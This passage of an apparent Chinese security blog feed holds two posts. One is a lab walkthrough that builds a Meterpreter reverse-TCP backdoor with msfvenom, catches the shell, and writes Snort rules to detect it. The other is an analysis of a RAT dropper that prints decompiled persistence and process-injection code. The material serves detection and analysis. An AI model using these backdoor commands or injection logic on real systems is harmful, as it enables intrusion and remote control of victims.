class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf &gt; use exploit/multi/handler<br>msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload linux/x86/meterpreter/reverse_tcp<br>payload =&gt; linux/x86/meterpreter/reverse_tcp<br>msf exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br>Payload options (linux/x86/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST                   <span class="hljs-built_in">yes</span>       The listen address (an interface may be specified)<br>   LPORT  4444             <span class="hljs-built_in">yes</span>       The listen port<br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target<br><br>msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.60.130<br>LHOST =&gt; 192.168.60.130<br>msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT 6666<br>LPORT =&gt; 6666<br>msf exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.60.130:6666 <br><br></code></pre></td></tr></table></figure><p>Wireshark开启抓包之后就可以启动Ubuntu上的后门程序了，一运行这个后门程序，Kali中就马上接收到了弹回的Shell，在进行几个常见后门控制命令的操作之后停止抓包对数据包进行分析。</p><h3 id="流量分析思路"><a href="#流量分析思路" class="headerlink" title="流量分析思路"></a>流量分析思路</h3><p>此处对流量分析有两个思路，一个是直接对木马server端IP和端口进行检测，另一个就是通过识别流量特征来进行检测。</p><p>由于木马端的IP和端口是固定的，所以规则很好编写，在这里就不再多说，重点放在通信数据包的内容识别上，下面是攻击机与受害主机通信过程中数据放在<code>binwalk</code>中的识别结果，可见<code>binwalk</code>识别出了这些数据中包含一个ELF文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> ⚡ root@Kali ~/Snort_test binwalk -e pack.bin<br><br>DECIMAL       HEXADECIMAL     <span class="hljs-keyword">DESCRIPTION</span><br>--------------------------------------------------------------------------------<br><span class="hljs-number">106</span>           <span class="hljs-number">0</span>x6A            ELF, <span class="hljs-number">32</span>-bit LSB shared object, Intel <span class="hljs-number">80386</span>, version <span class="hljs-number">1</span> (SYSV)<br><span class="hljs-number">603274</span>        <span class="hljs-number">0</span>x9348A         Base64 standard index table<br><span class="hljs-number">607677</span>        <span class="hljs-number">0</span>x945BD         Unix path: <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin:/u</span>sr<span class="hljs-regexp">/local/</span>bin:<span class="hljs-regexp">/usr/</span>sbin:<span class="hljs-regexp">/usr/</span>bin:<span class="hljs-regexp">/sbin:/</span>bin:<span class="hljs-regexp">/usr/g</span>ames:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/games:/</span>system<span class="hljs-regexp">/bin:/</span>system<span class="hljs-regexp">/sbin:/</span>system/xbin<br><span class="hljs-number">617386</span>        <span class="hljs-number">0</span>x96BAA         Base64 standard index table<br><span class="hljs-number">629219</span>        <span class="hljs-number">0</span>x999E3         Unix path: <span class="hljs-regexp">/usr/</span>bin/ntlm_auth<br><span class="hljs-number">630378</span>        <span class="hljs-number">0</span>x99E6A         Base64 standard index table<br><span class="hljs-number">633932</span>        <span class="hljs-number">0</span>x9AC4C         PEM certificate<br><span class="hljs-number">639609</span>        <span class="hljs-number">0</span>x9C279         PEM RSA <span class="hljs-keyword">private</span> key<br><span class="hljs-number">639850</span>        <span class="hljs-number">0</span>x9C36A         SHA256 hash constants, little endian<br><span class="hljs-number">640266</span>        <span class="hljs-number">0</span>x9C50A         Base64 standard index table<br><span class="hljs-number">647099</span>        <span class="hljs-number">0</span>x9DFBB         Unix path: <span class="hljs-regexp">/sys/</span>devices<span class="hljs-regexp">/system/</span>cpu<span class="hljs-regexp">/cpu%d/</span>cpufreq/cpuinfo_max_freq<br><span class="hljs-number">647878</span>        <span class="hljs-number">0</span>x9E2C6         Unix path: <span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>%s/speed<br><span class="hljs-number">648311</span>        <span class="hljs-number">0</span>x9E477         Unix path: <span class="hljs-regexp">/dev/</span>disk/by-uuid<br><span class="hljs-number">649497</span>        <span class="hljs-number">0</span>x9E919         Copyright string: <span class="hljs-string">&quot;Copyright 1995-2013 Jean-loup Gailly and Mark Adler &quot;</span><br><span class="hljs-number">652665</span>        <span class="hljs-number">0</span>x9F579         Copyright string: <span class="hljs-string">&quot;Copyright 1995-2013 Mark Adler &quot;</span><br><span class="hljs-number">655530</span>        <span class="hljs-number">0</span>xA00AA         CRC32 polynomial table, little endian<br><span class="hljs-number">659626</span>        <span class="hljs-number">0</span>xA10AA         CRC32 polynomial table, big endian<br><span class="hljs-number">667154</span>        <span class="hljs-number">0</span>xA2E12         Unix path: <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin:/</span>bin:<span class="hljs-regexp">/usr/</span>bin<br><span class="hljs-number">669796</span>        <span class="hljs-number">0</span>xA3864         Unix path: <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/nscd/</span>socket<br></code></pre></td></tr></table></figure><p>可以从Wireshark中看到流量的高峰值，此时应该是正在传输用于反射型DLL注入的数据</p><p><img src="https://i.loli.net/2019/05/21/5ce34df99c9eb75679.png"></p><p>将数据文件直接放到IDA中进行分析可以看到ELF部分的代码逻辑，由于没有正确的修复ELF文件头，且偏移位置也未手动修复，所以IDA无法正确识别出导入函数导出函数等部分，但是这不重要了，多次测试meterpreter传递的数据，发现针对此攻击环境数据包的内容并无明显变化，尤其是ELF文件部分前后测试中完全一致，因此可以初步推测meterpreter针对于同一后门文件并无数据混淆， 那么就可以将数据包中的部分具有特征的数据作为特征值进行匹配了，与此同时应该注意选取的特征值应该具有一定的辨识性，避免误报情况的产生。</p><h3 id="规则编写"><a href="#规则编写" class="headerlink" title="规则编写"></a>规则编写</h3><p>攻击机IP（Kali Linux）：192.168.60.130</p><p>受害者IP（Ubuntu）：192.168.60.131</p><p><strong>定义变量</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var</span> Attacker_NET $(Attacker_NET:-<span class="hljs-number">192.168.60.130</span>/<span class="hljs-number">24</span>)<br><span class="hljs-attribute">var</span> Victim_NET $(Victim_NET:-<span class="hljs-number">192.168.60.131</span>/<span class="hljs-number">24</span>)<br></code></pre></td></tr></table></figure><p>在确定木马IP地址的情况下可以直接编写规则alert一切与木马server端IP通信的数据包</p><p>规则有多种不同的实现方式：</p><ul><li>对主机与恶意IP的所有数据包警报：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruls">alert tcp Attacker_NET any &lt;&gt; Victim_NET any (msg: &quot;A malicious IP attack was detected&quot;;sid:1)<br></code></pre></td></tr></table></figure><ul><li>对通信过程中的某些数据警报：</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">alert tcp Attacker_NET any &lt;&gt; Victim_NET any (<span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;|6D626564746C735F706C6174666F726D5F656E74726F70795F706F6C6C00657865637665006D626564746C735F6374725F647262675F72616E646F6D0077656263616D5F73746F70005F696E69740077656263616D5F7374617274005F5F676D740077656263616D5F6765745F6672616D65006D61696E00617564696F5F6D69635F6C6973740077656263616D5F6C697374005F66696E6900617564696F5F6D69635F737461727400617564696F5F6D69635F73746F70006D626564746C735F783530395F6372745F70726F66696C655F64656661756C74006D626564746C735F656E74726F70795F66756E63|&quot;</span>;msg:<span class="hljs-string">&quot;Malicious file detecteds&quot;</span>;sid:<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>规则编写无明确的限制，个人认为规则的标准在于效率和准确率。</p><h3 id="应用规则"><a href="#应用规则" class="headerlink" title="应用规则"></a>应用规则</h3><p>注释掉除了自己的规则以外的其他所有规则：</p><p><img src="https://i.loli.net/2019/05/24/5ce77e98ee8d332359.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo snort -c <span class="hljs-regexp">/etc/</span>snort/snort.conf -A console<br></code></pre></td></tr></table></figure><p>检测结果：</p><p><img src="https://i.loli.net/2019/05/24/5ce78a7c6efcc77881.png"></p><p>检测成功</p><h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>Snort是一款好工具，<del>废话</del>，但是在实验过程中发现由于性能问题，有的数据包会来不及处理，这可能是Snort在实际环境中部署时需要解决的问题。而且觉得类似于此类规则匹配的IDS应该可以与机器学习结合一下，规则不再需要网络安全管理员手动添加，而是根据机器学习智能化识别，或许是一个很不错的想法。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是大名鼎鼎的meterpreter。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装Snort&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安装Snort的方法网上有教程，因此就不多说了，最简单的方法就是apt-get。&lt;/p&gt;
&lt;p&gt;Kali启动！&lt;/p&gt;
&lt;p&gt;用Kali Linux中的msfvenom生成一个后门程序：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs bash&quot;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.60.130 LPORT=6666 -f elf &amp;gt; shell.elf&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="入侵检测" scheme="https://www.hvnt3r.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"/>
    
    
    <category term="Snort" scheme="https://www.hvnt3r.top/tags/Snort/"/>
    
    <category term="IDS" scheme="https://www.hvnt3r.top/tags/IDS/"/>
    
  </entry>
  
  <entry>
    <title>远程控制木马分析报告</title>
    <link href="https://www.hvnt3r.top/2019/05/%E6%9F%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    <id>https://www.hvnt3r.top/2019/05/%E6%9F%90%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</id>
    <published>2019-05-17T08:51:26.000Z</published>
    <updated>2022-02-16T12:06:42.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx-EXE"><a href="#样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx-EXE" class="headerlink" title="样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE"></a>样本主体分析18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE</h2><h3 id="样本基本信息："><a href="#样本基本信息：" class="headerlink" title="样本基本信息："></a>样本基本信息：</h3><table><thead><tr><th>属性</th><th>值</th></tr></thead><tbody><tr><td>Filename</td><td>18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE</td></tr><tr><td>MD5</td><td>b9b34748f958c31e12ae3741f728be99</td></tr><tr><td>SHA-1</td><td>a806386497e280612eadbe87e2104550c95ab617</td></tr><tr><td>File Type</td><td>Win32 EXE</td></tr><tr><td>Magic</td><td>MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit</td></tr><tr><td>SSDeep</td><td>12288:DKGk6+Tjk6PQEAEd0bpkRgNyPBODdgVRX6Tw:Dz+TwNE0NfcAT</td></tr><tr><td>File Size</td><td>467.39 KB</td></tr></tbody></table><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>18xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.EXE</p><span id="more"></span><p>将文件载入到IDA中，分析start函数，找到了一些相对不重要的函数和一个负责主要逻辑的函数</p><p><img src="https://i.loli.net/2019/05/15/5cdc158f0cb0278057.png"></p><p>找到关键函数sub_401A40()</p><p><img src="https://i.loli.net/2019/05/15/5cdc15bc42cb211720.png"></p><p>通过查看函数调用图判断此函数的大致执行流：</p><p><img src="https://i.loli.net/2019/05/15/5cdc169e9627667242.png"></p><p>通过API判断此函数的主要功能：文件读写，文件遍历，疑似反调试，创建进程。</p><p>通过以上结论判断此文件为病毒Droper，载入OD对关键函数进一步分析：</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>此处省略沙箱中的执行结果，将沙箱的分析结果作为动态分析的辅助提示进行动态分析。</p><p>获取当前程序的文件名和所在文件路径：</p><p><img src="https://i.loli.net/2019/05/15/5cdc18fe3d31b90747.png"></p><p>进入子函数，获取当前文件路径</p><p><img src="https://i.loli.net/2019/05/15/5cdc1a4f86aae86984.png"></p><p>获取自身文件指针，将文件读取到内存中：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1b0d97ac894126.png"></p><p>用GetWindowsDirectoryA()函数获取Windows目录：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1b66821d940005.png"></p><p><img src="https://i.loli.net/2019/05/15/5cdc1b81264f266481.png"></p><p>进行字符串拼接：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1bc33218874582.png"></p><p>拼接出新的路径：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1c16d21cb31371.png"></p><p>新的文件名：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1c550dae989048.png"></p><p>删除自身：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1ca3357e325075.png"></p><p>将内存中的数据写入到新的文件中：</p><p><img src="https://i.loli.net/2019/05/15/5cdc1ccb120c867019.png"></p><p>创建目录18xxxxxxxxxxxxxxxxx</p><p><img src="https://i.loli.net/2019/05/16/5cdd23b441d3c37779.png"></p><p>循环拼接出要写入的文件的文件名：</p><p><img src="https://i.loli.net/2019/05/17/5cde78b69c1c975221.png"></p><p>整体流程如下：</p><p>函数sub404260负责将图片写入，每存储一张照片就将.liz后缀的临时文件删除：</p><p><img src="https://i.loli.net/2019/05/16/5cdd41c7c6fe925052.png"></p><p>除了色情图片，程序还释放了一个名为Thumbs.db的文件。</p><p><img src="https://i.loli.net/2019/05/16/5cdd42826bc4a18095.png"></p><p>启动远控进程rat.EXE：</p><p><img src="https://i.loli.net/2019/05/15/5cdc20083a95036171.png"></p><p>检测两个进程–熊猫卫士和趋势科技的杀软：</p><p><img src="https://i.loli.net/2019/05/17/5cde1fe31442025832.png"></p><p>删除文件<code>C:\Users\Hvnt3r\AppData\Local\Temp\\byeyou.tmp</code>：</p><p><img src="https://i.loli.net/2019/05/15/5cdc2134e3cbd96760.png"></p><p>文件复制：</p><p><img src="https://i.loli.net/2019/05/17/5cde7891d1d4541153.png"></p><p><img src="https://i.loli.net/2019/05/16/5cdd177b5e8ca31906.png"></p><h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><p>得出此程序的功能：</p><ul><li>创建同名目录并在目录下释放文件</li><li>杀毒软件检测</li><li>在<code>C:\Users\Hvnt3r\AppData\Local\Temp\</code>目录创建byeyou.tmp备份文件</li><li>在<code>C:\Users\Hvnt3r\AppData\Local\Temp\</code>目录创建rat.EXE后门程序并启动此程序</li></ul><p>此程序是一个Dropper，完成恶意文件的释放过程，接下来分析此文件释放出的文件rat.EXE。</p><h2 id="子程序分析rat-EXE"><a href="#子程序分析rat-EXE" class="headerlink" title="子程序分析rat.EXE"></a>子程序分析rat.EXE</h2><p>从名字看这个应该是一个远程控制程序，但是为了避免恶意代码编写者故意使用特殊的文件名来误导分析者的思路，因此还是要重点分析一下。</p><h3 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h3><p><img src="https://i.loli.net/2019/05/16/5cdd786a2baea45581.png"></p><p><img src="https://i.loli.net/2019/05/16/5cdd7881c271258701.png"></p><p>从函数的调用关系来看这个程序可能有如下作用：</p><p>文件读写、注册表修改、从程序资源节释放文件、进程相关操作。</p><p>既然看到了常见的程序资源节的相关函数，将程序载入到ResourceHacker中看一下，果然在资源节中发现了一个疑似的PE文件：</p><p><img src="https://i.loli.net/2019/05/16/5cdd796f1749290138.png"></p><p>将文件提取出来存储为rsc.exe，稍后分析。</p><p>程序的基本静态分析结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( ExpandEnvironmentStringsA(Src, &amp;Dst, <span class="hljs-number">0x104</span>u) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( CreateDirectoryA(&amp;Dst, <span class="hljs-number">0</span>) == <span class="hljs-number">1</span> )<br>    &#123;<br>      SHGetSpecialFolderPathA(<span class="hljs-number">0</span>, &amp;pszPath, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">// 获取某一文件的路径</span><br>      GetShortPathNameA(&amp;pszPath, &amp;szShortPath, <span class="hljs-number">0x104</span>u);<span class="hljs-comment">// 获取指定路径的短路径形式</span><br>      <span class="hljs-built_in">strcat</span>(&amp;szShortPath, asc_403234);         <span class="hljs-comment">// \*.*</span><br>      <span class="hljs-built_in">strcpy</span>(&amp;szLongPath, &amp;Dst);<br>      <span class="hljs-built_in">strcat</span>(&amp;szLongPath, asc_403230);          <span class="hljs-comment">// \</span><br><span class="hljs-comment">      GetShortPathNameA(&amp;szLongPath, &amp;v22, 0x104u);// 获取指定路径的短路径形式</span><br>      <span class="hljs-built_in">sprintf</span>(&amp;Dest, aCmdExeCCopySS, &amp;szShortPath, &amp;v22);<span class="hljs-comment">// cmd.exe /c copy %s %s</span><br>      <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(StartupInfo));<br>      StartupInfo.wShowWindow = <span class="hljs-number">0</span>;<br>      StartupInfo.cb = <span class="hljs-number">68</span>;<br>      StartupInfo.dwFlags = <span class="hljs-number">1</span>;<br>      CreateProcessA(<span class="hljs-number">0</span>, &amp;Dest, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<span class="hljs-comment">// 执行CMD命令，完成文件复制操作</span><br>      WaitForSingleObject(ProcessInformation.hProcess, <span class="hljs-number">0xFFFFFFFF</span>);<br>      <span class="hljs-keyword">if</span> ( !ExpandEnvironmentStringsA(aAllusersprofil_0, &amp;v23, <span class="hljs-number">0x104</span>u) )<span class="hljs-comment">// %ALLUSERSPROFILE%\Application Data\Microsoft</span><br>                                                <span class="hljs-comment">// 将环境变量补充维完整形式</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      GetShortPathNameA(&amp;v23, &amp;v17, <span class="hljs-number">0x104</span>u);<br>      <span class="hljs-built_in">sprintf</span>(&amp;CommandLine, aRegeditExeSESB, &amp;v17);<span class="hljs-comment">// regedit.exe /s /e  %s\back1.reg &quot;HKEY_CURRENT_USER\Software\Micro</span><br>      <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(StartupInfo));<br>      StartupInfo.wShowWindow = <span class="hljs-number">0</span>;<br>      StartupInfo.cb = <span class="hljs-number">68</span>;<br>      StartupInfo.dwFlags = <span class="hljs-number">1</span>;<br>      CreateProcessA(<span class="hljs-number">0</span>, &amp;CommandLine, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<span class="hljs-comment">// 执行注册表备份</span><br>      <span class="hljs-built_in">sprintf</span>(&amp;CommandLine, aRegeditExeSESB_0, &amp;v17);<span class="hljs-comment">// cmd.exe /c copy %s %s</span><br>      WaitForSingleObject(ProcessInformation.hProcess, <span class="hljs-number">0xFFFFFFFF</span>);<br>      <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(StartupInfo));<br>      StartupInfo.wShowWindow = <span class="hljs-number">0</span>;<br>      StartupInfo.cb = <span class="hljs-number">68</span>;<br>      StartupInfo.dwFlags = <span class="hljs-number">1</span>;<br>      CreateProcessA(<span class="hljs-number">0</span>, &amp;CommandLine, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<span class="hljs-comment">// 执行文件复制</span><br>      WaitForSingleObject(ProcessInformation.hProcess, <span class="hljs-number">0xFFFFFFFF</span>);<br>      <span class="hljs-keyword">if</span> ( RegOpenKeyExA(HKEY_CURRENT_USER, SubKey, <span class="hljs-number">0</span>, <span class="hljs-number">0xF003F</span>u, &amp;phkResult) )<span class="hljs-comment">// Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      RegSetValueExA(phkResult, ValueName, <span class="hljs-number">0</span>, <span class="hljs-number">1u</span>, &amp;Dst, <span class="hljs-built_in">strlen</span>(&amp;Dst) + <span class="hljs-number">1</span>);<span class="hljs-comment">// 添加自启动</span><br>      RegCloseKey(phkResult);<br>      <span class="hljs-keyword">if</span> ( RegOpenKeyExA(HKEY_CURRENT_USER, aSoftwareMicros_0, <span class="hljs-number">0</span>, <span class="hljs-number">0xF003F</span>u, &amp;phkResult) )<span class="hljs-comment">// Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Fol</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      RegSetValueExA(phkResult, ValueName, <span class="hljs-number">0</span>, <span class="hljs-number">1u</span>, &amp;Dst, <span class="hljs-built_in">strlen</span>(&amp;Dst) + <span class="hljs-number">1</span>);<br>      RegCloseKey(phkResult);<br>    &#125;<br>    <span class="hljs-built_in">strcat</span>(&amp;Dst, aCtfmonExe);                   <span class="hljs-comment">// ctfmon.exe</span><br>    v4 = _p___argv(<span class="hljs-number">0</span>, &amp;Dst);<br>    CopyFileA(**v4, &amp;Dst, <span class="hljs-number">0</span>);                   <span class="hljs-comment">// 创建文件ctfmon.exe</span><br>    v5 = FindResourceA(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0xA</span>);              <span class="hljs-comment">// 从资源节提取数据</span><br>    v6 = v5;<br>    <span class="hljs-keyword">if</span> ( v5 )<br>    &#123;<br>      v7 = SizeofResource(<span class="hljs-number">0</span>, v5);<br>      <span class="hljs-keyword">if</span> ( v7 )<br>      &#123;<br>        v8 = LoadResource(<span class="hljs-number">0</span>, v6);<br>        <span class="hljs-keyword">if</span> ( v8 )<br>        &#123;<br>          v9 = LockResource(v8);<br>          <span class="hljs-keyword">if</span> ( v9 )<br>          &#123;<br>            GetSystemDirectoryA(&amp;Buffer, <span class="hljs-number">0x104</span>u);<br>            <span class="hljs-built_in">strcat</span>(&amp;Buffer, aAlgExe);           <span class="hljs-comment">// alg.exe</span><br>            sub_4016D0(v9, &amp;unk_4032C0, v7, &amp;Buffer);<span class="hljs-comment">// 实现进程注入</span><br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>其实经过静态分析之后此程序的执行逻辑已经比较完善了，但是有些细节还是要通过动态分析来进一步确定：</p><h3 id="动态分析-1"><a href="#动态分析-1" class="headerlink" title="动态分析"></a>动态分析</h3><p>创建文件夹，如果目录已存在则跳过，如果不存在则执行下面的操作：</p><p><img src="https://i.loli.net/2019/05/16/5cdd7d715871131390.png"></p><p>复制当前目录</p><p><img src="https://i.loli.net/2019/05/16/5cdd7e5b4fc5457591.png"></p><p>执行注册表部分备份：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">regedit.exe <span class="hljs-regexp">/s /</span>e  %s\back1.reg <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&quot;</span><br></code></pre></td></tr></table></figure><p>设置开机启动</p><p><img src="https://i.loli.net/2019/05/16/5cdd81f35b2d898013.png"></p><p>将自身复制为ctfmon.exe</p><p><img src="https://i.loli.net/2019/05/16/5cdd85f2dbbe266549.png"></p><p>将从资源节中提取的PE数据注入到alg.exe中</p><p><img src="https://i.loli.net/2019/05/17/5cde781a2488714506.png"></p><p>获取函数ZwUnmapViewOfSection的地址</p><p><img src="https://i.loli.net/2019/05/16/5cdd87275e2c878052.png"></p><p>实现进程注入</p><p><img src="https://i.loli.net/2019/05/16/5cdd87a1bd17a11683.png"></p><p><img src="https://i.loli.net/2019/05/16/5cdd889e40da963845.png"></p><h3 id="分析结果-1"><a href="#分析结果-1" class="headerlink" title="分析结果"></a>分析结果</h3><p>此程序实现的功能如下：</p><ul><li>设置开机启动，实现长期驻留</li><li>文件备份</li><li>进程注入</li><li>唤醒注入的程序</li></ul><h2 id="子程序分析rsc-exe"><a href="#子程序分析rsc-exe" class="headerlink" title="子程序分析rsc.exe"></a>子程序分析rsc.exe</h2><h3 id="静态分析-2"><a href="#静态分析-2" class="headerlink" title="静态分析"></a>静态分析</h3><p>此木马使用GetProcAddress函数来获取所需函数的地址</p><p><img src="https://i.loli.net/2019/05/17/5cde0daa3bf5153751.png"></p><p>程序中有很多地方都用到了这种方法来降低自身被安全人员发现的概率。</p><p><img src="https://i.loli.net/2019/05/17/5cde6caf4f75939607.png"></p><p>SeDebugPrivilege提权：</p><p><img src="https://i.loli.net/2019/05/17/5cde755d140c587246.png"></p><p>主要函数</p><p><img src="https://i.loli.net/2019/05/17/5cde6ccfccb9659041.png"></p><h3 id="动态分析-2"><a href="#动态分析-2" class="headerlink" title="动态分析"></a>动态分析</h3><p>打开网址<code>http[:]//www[.]softover[.]net/chendog/rat[.]gif</code></p><p><img src="https://i.loli.net/2019/05/17/5cde1b617ca4982366.png"></p><p>下载此文件</p><p><img src="https://i.loli.net/2019/05/17/5cde1c081944710175.png"></p><p>其他相关DNS查询</p><p><img src="https://i.loli.net/2019/05/17/5cde1f92caa9384845.png"></p><p>对比代码发现此程序可能是远程控制软件psyrat2的变种。</p><p>后门功能实现的主要函数为sub_403190，代码量较大，这里就不一一说明分析过程了，下面直接给出分析结果。</p><h3 id="分析结果-2"><a href="#分析结果-2" class="headerlink" 